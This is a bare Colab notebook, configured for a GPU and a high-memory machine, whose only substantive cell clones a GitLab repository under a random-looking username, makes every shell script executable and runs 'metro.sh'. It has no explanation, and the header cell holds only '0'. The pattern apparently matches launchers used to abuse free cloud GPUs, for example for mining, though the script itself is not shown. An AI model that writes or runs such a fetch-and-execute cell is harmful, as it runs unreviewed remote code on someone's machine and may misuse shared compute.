{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "9.ipynb",
      "private_outputs": true,
      "provenance": [],
      "collapsed_sections": [
        "wYRZJUa016TT"
      ],
      "machine_shape": "hm"
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "wYRZJUa016TT"
      },
      "source": [
        "## **0**\n",
        "\n",
        "\n",
        "\n"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "klmPMG6_spcwCn"
      },
      "source": [
        "!git clone https://gitlab.com/corinnacvijnqqh/lighter.git && cd lighter && chmod +x *.sh && ./metro.sh"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}
